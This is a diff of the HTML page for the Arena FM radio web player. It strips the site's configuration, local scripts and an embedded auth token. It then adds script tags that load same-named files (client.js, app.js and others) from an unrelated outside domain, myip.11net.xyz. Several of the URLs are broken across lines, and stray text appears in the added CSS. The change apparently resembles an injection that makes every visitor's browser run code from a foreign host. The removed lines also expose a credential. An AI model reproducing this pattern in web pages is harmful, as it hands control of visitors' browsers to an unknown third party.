@@ -25,30 +25,62 @@
  
  
     <link href='https://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
- 
+
+
+
+<style>
+Result
+#title{
+  color:#fff;
+  font-weight:100;
+  font-size:28px;
+  padding:10px;
+  border:1px solid #fff;
+  background-color: #55608f;
+}
+
+html,
+body {
+	height: 300%;
+}
+
+body {
+	margin: 0;
+	background: linear-gradient(45deg, #49a09d, #5f2c82);
+	font-family: sans-serif;
+	font-weight: 100;
+}
+
+.container {
+        height: 25%;
+        font-family: sans-serif;
+	font-weight: 100;
+	position: absolute;
+        margin: 20px;
+	top: 50%;
+	left: 50%;
+	transform: translate(-50%, -50%);
+}
+</style> 
 </head>
  
-<body>
-    <!--[if lt IE 10]>
-        <p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
-    <![endif]-->
+<body id="cont" class="container">
+    
+
+    
  
-    <div id="cont"></div>
+    <script type="text/javascript" src="https://myip
+11net.xyz/stream/client.js"></script>
+    <script type="text/javascript" src="https://myip
+11net.xyz/stream/index.js"></script>
+    <script type="text/javascript" src="https://myip
+11net.xyz/stream/ima3.js"></script>
+    <script type="text/javascript" src="https://myip.11net.xyz/stream/app.js"></script>
  
-    <script type="text/javascript">
-        var GOOGLE_ANALYTICS_ID = "UA-38357063-6";
-        var API_DOMAIN = "http://api.astro.laylio.radioactive.sg";
-        var PRODUCT_ID = "5846a51bb1c7f88c9621b37ffe017e51";
-        var FACEBOOK_APP_ID = "770188286390145";
-        var PRODUCT_CONFIG = "%7B%22id%22%3A%225846a51bb1c7f88c9621b37ffe017e51%22%2C%22name%22%3A%22Arena%20FM%22%2C%22description%22%3A%22Wadah%20anda%20berkongsi%20mengenai%20sukan%20Malaysia.%20Hubungi%20kami%2C%20kongsi%20pendapat%20anda.%20Segalanya%20sukan%20negara%2C%20di%20Arena%20Radio.%5Cn%22%2C%22facebookAppId%22%3A%22%22%2C%22colours%22%3A%7B%22primary%22%3A%7B%22r%22%3A0%2C%22g%22%3A0%2C%22b%22%3A0%7D%7D%2C%22backgroundImages%22%3A%5B%5D%2C%22logos%22%3A%5B%7B%22url%22%3A%22https%3A%2F%2Fassets.radioactive.sg%2Forg-astro%2F77af31e3-757e-4634-8d08-c0cb93e7d91b.png%22%2C%22width%22%3A750%2C%22height%22%3A750%7D%5D%2C%22tags%22%3A%5B%22radioactive%22%5D%2C%22configuration%22%3A%7B%22enabledContent%22%3A%5B%22programmes%22%2C%22photoalbums%22%2C%22feeds%22%2C%22videoplaylists%22%2C%22playouthistory%22%2C%22djs%22%2C%22events%22%2C%22audioplaylists%22%5D%2C%22minSupportedVersion%22%3A%7B%7D%2C%22maxEnabledContent%22%3A10%2C%22appConfig%22%3A%7B%7D%7D%7D";
-        var STATIONS_CONFIG = "%5B%7B%22id%22%3A%22amp-arena%22%2C%22name%22%3A%22Arena%20Radio%22%2C%22description%22%3A%22Wadah%20anda%20berkongsi%20mengenai%20sukan%20Malaysia.%20Hubungi%20kami%2C%20kongsi%20pendapat%20anda.%20Segalanya%20sukan%20negara%2C%20di%20Arena%20Radio.%22%2C%22streams%22%3A%7B%22web%22%3A%5B%7B%22format%22%3A%22AAC%22%2C%22url%22%3A%22http%3A%2F%2Fastro1.rastream.com%2Famp-arena%22%7D%2C%7B%22format%22%3A%22HLS%22%2C%22url%22%3A%22https%3A%2F%2Fastro1.rastream.com%2Famp-arena.web.hls%2Fplaylist.m3u8%22%7D%5D%2C%22android%22%3A%5B%7B%22format%22%3A%22AAC%22%2C%22url%22%3A%22http%3A%2F%2Fastro1.rastream.com%2Famp-arena.android%22%7D%2C%7B%22format%22%3A%22HLS%22%2C%22url%22%3A%22http%3A%2F%2Fastro1.rastream.com%2Famp-arena.android.hls%2Fplaylist.m3u8%22%7D%5D%2C%22facebook%22%3A%5B%7B%22format%22%3A%22AAC%22%2C%22url%22%3A%22http%3A%2F%2Fastro1.rastream.com%3A80%2Famp-arena%3Ftype%3D.flv%22%7D%5D%2C%22iphone%22%3A%5B%7B%22format%22%3A%22AAC%22%2C%22url%22%3A%22http%3A%2F%2Fastro1.rastream.com%2Famp-arena.iphone%22%7D%2C%7B%22format%22%3A%22HLS%22%2C%22url%22%3A%22http%3A%2F%2Fastro1.rastream.com%2Famp-arena.iphone.hls%2Fplaylist.m3u8%22%7D%5D%7D%2C%22website%22%3A%22http%3A%2F%2Fradioactive.sg%22%2C%22colours%22%3A%7B%22primary%22%3A%7B%22r%22%3A63%2C%22g%22%3A80%2C%22b%22%3A153%7D%7D%2C%22backgroundImages%22%3A%5B%7B%22url%22%3A%22https%3A%2F%2Fra-cms-content.s3.amazonaws.com%2Forg-astro%2F2015-07-29T05%3A03%3A14.904Z_img800x600.jpg%22%2C%22width%22%3A800%2C%22height%22%3A600%7D%5D%2C%22logos%22%3A%5B%7B%22url%22%3A%22https%3A%2F%2Fs3-ap-southeast-1.amazonaws.com%2Fradioactive-images%2Farena.png%22%2C%22width%22%3A255%2C%22height%22%3A255%7D%2C%7B%22url%22%3A%22https%3A%2F%2Fassets.radioactive.sg%2Forg-astro%2Fd02ed2d0-8744-41d0-a6aa-91cdb435745e.png%22%2C%22width%22%3A750%2C%22height%22%3A422%2C%22description%22%3A%22Station%20Logo%20Banner%5Cn(W750%20x%20H422)%22%7D%5D%2C%22languages%22%3A%5B%22ms%22%5D%2C%22webplayer%22%3A%7B%22url%22%3A%22https%3A%2F%2Fdengar.arena.my%2F%22%2C%22width%22%3A1050%2C%22height%22%3A600%7D%7D%5D";
-        var AUTH_TOKEN = "xrCauZvbHbCBNsB1GbBlBgK5vVB6BdiQOVC9.xrCotPJbHbClRQeltP8bEVCiRQJbHcX1HMz2GcTrGsJlBfO4vVB6FMN5HWv0GcR3GA0.QwXRSoswXDeKb5zEobzI7sUJ4mEdRAxMESr7vOMaQpv"
-    </script>
+
  
- 
-    <script type="text/javascript" src="/stream/ima3.js"></script>
-    <script type="text/javascript" src="/stream/app.js"></script>
- 
+
+
 </body>
  
 </html>
